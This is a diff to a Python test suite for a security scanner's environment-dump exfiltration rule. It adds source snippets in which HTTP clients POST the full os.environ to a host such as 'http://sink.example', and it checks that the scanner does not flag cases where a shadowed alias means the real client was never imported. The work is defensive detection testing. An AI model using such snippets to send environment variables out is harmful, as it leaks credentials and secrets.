@@ -764,9 +764,34 @@ def test_python_shadowed_import_alias_does_not_create_a_client_handle(tmp_path: 
     assert not [finding for finding in findings if finding["rule_id"] == "python-env-dump-exfil"]
 
 
-def test_python_comprehension_walrus_shadows_an_inherited_constructor_alias(tmp_path: Path) -> None:
-    """A skipped comprehension must not leave a definition-order alias false positive behind."""
-    source = "import os\nimport requests as clientlib\n\ndef send(host):\n    session = clientlib.Session()\n    [(clientlib := config) for _ in [1]]\n    session.post(host, json=dict(os.environ))\n"
+@pytest.mark.parametrize(
+    "source",
+    [
+        ("import os\n\ndef build(host):\n    requests = configlib\n    session = requests.Session()\n    session.post(host, json=dict(os.environ))\n"),
+        ("import os\n\nclass requests:\n    Session = configlib.Session\n\ndef build(host):\n    session = requests.Session()\n    session.post(host, json=dict(os.environ))\n"),
+        ("import os\n\ndef build(host):\n    http = configlib\n    connection = http.client.HTTPConnection(host)\n    connection.request('POST', '/', str(dict(os.environ)))\n"),
+        ("import os\n\nasync def build(host):\n    aiohttp = configlib\n    async with aiohttp.ClientSession() as session:\n        await session.post(host, json=dict(os.environ))\n"),
+        ("import os\n\ndef build(host):\n    urllib3 = configlib\n    pool = urllib3.PoolManager()\n    pool.request('POST', host, fields=dict(os.environ))\n"),
+        "import os\nsession = requests.Session()\nsession.post(host, json=dict(os.environ))\n",
+    ],
+)
+def test_python_canonical_constructor_name_requires_a_proven_import(tmp_path: Path, source: str) -> None:
+    """A bare canonical-looking name is not evidence that the real client module was imported."""
+    assert _scan_reports_client_exfil(tmp_path, source) is False
+
+
+def test_python_comprehension_walrus_makes_the_import_alias_local_for_the_whole_function(tmp_path: Path) -> None:
+    """The later walrus makes the earlier alias read unbound, so inheriting it would be a false positive."""
+    source = "import os\nimport requests as clientlib\n\ndef send(host):\n    session = clientlib.Session()\n    [(clientlib := config) for _ in [1]]\n    session.post(host, json=dict(os.environ))\n\nsend(host)\n"
+    with pytest.raises(UnboundLocalError, match="clientlib"):
+        _runtime_client_receivers(source, raise_errors=True)
+    assert _scan_reports_client_exfil(tmp_path, source) is False
+
+
+def test_python_comprehension_walrus_before_construction_invalidates_the_alias(tmp_path: Path) -> None:
+    """After the walrus runs, construction uses the benign replacement rather than the imported client."""
+    source = "import os\nimport requests as clientlib\n\ndef send(host):\n    [(clientlib := configlib) for _ in [1]]\n    session = clientlib.Session()\n    session.post(host, json=dict(os.environ))\n\nsend(host)\n"
+    assert _runtime_client_receivers(source) == ["config"]
     assert _scan_reports_client_exfil(tmp_path, source) is False
 
 
@@ -880,7 +905,7 @@ def test_python_destructuring_target_still_drops_the_client_handle(tmp_path: Pat
     assert not [finding for finding in findings if finding["rule_id"] == "python-env-dump-exfil"]
 
 
-def _runtime_client_receivers(source: str) -> list[str]:
+def _runtime_client_receivers(source: str, *, raise_errors: bool = False) -> list[str]:
     """Every receiver a sink method actually ran on, in call order.
 
     Asserting the exact sequence stops a probe from passing because some *other* receiver happened
@@ -917,6 +942,7 @@ def _runtime_client_receivers(source: str) -> list[str]:
     namespace = {
         "os": os,
         "host": "http://sink.example",
+        "clientlib": client_module,
         "config": _Recorder("config"),
         "configlib": config_module,
         "r": client_module,
@@ -926,8 +952,9 @@ def _runtime_client_receivers(source: str) -> list[str]:
     body = "\n".join(line for line in source.splitlines() if not line.startswith(("import ", "from ")))
     try:
         exec(compile(body, "<oracle>", "exec", dont_inherit=True), namespace)  # noqa: S102 - controlled in-repo probe
-    except BaseException:  # noqa: BLE001 - a recorded sink call precedes any raised error
-        pass
+    except BaseException:  # noqa: BLE001 - controlled oracle optionally exposes the exact runtime failure
+        if raise_errors:
+            raise
     return calls
 
 
